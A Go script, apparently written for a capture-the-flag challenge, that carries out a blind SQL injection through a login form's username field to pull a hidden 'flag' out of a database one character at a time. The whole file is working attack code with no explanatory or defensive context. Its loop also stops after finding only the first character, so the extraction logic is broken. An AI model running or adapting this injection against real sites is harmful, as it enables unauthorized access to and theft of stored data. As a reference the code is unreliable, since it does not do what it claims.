package main

import (
    "fmt"
    "io/ioutil"
    "net/http"
	"strings"
)

func main() {
	var (
		url string = "<URL>/login"
		placeholder string
		form string
		values string = "abcdefghijklmnopqrstuvwxyz1234567890-=[]\\~!@#$^&*()+{}|;:\",./<>? "
		passwordArray []string
		message bool
	)

	for message != true {
		for v := 0; v < len(values); v++ {
			placeholder = string(values[v])
			constantGuessPart := strings.Join(passwordArray, "")
			form = fmt.Sprintf("username=' OR 3=(SELECT id FROM pages WHERE id=3 AND body LIKE \"%s%s%s\");--&password=pass", constantGuessPart, placeholder, "%%")
			conn, err := http.NewRequest("POST", url, strings.NewReader(form))
			if err!= nil {
				fmt.Println("Connection Error:", err)
				return
			}
			conn.Header.Add("Content-Type", "application/x-www-form-urlencoded")

			client := &http.Client{}
			resp, err := client.Do(conn)
			if err!= nil {
				fmt.Println("Response Error:", err)
				return
			}
			defer resp.Body.Close()

			body, err := ioutil.ReadAll(resp.Body)
			if err!= nil {
				fmt.Println("Error reading response body:", err)
				return
			}

			if strings.Contains(string(body),"Invalid password") {
				passwordArray = append(passwordArray, string(values[v]))
				fmt.Println("The flag is:", passwordArray)
				message = true
				break
			}
		}
	 }
}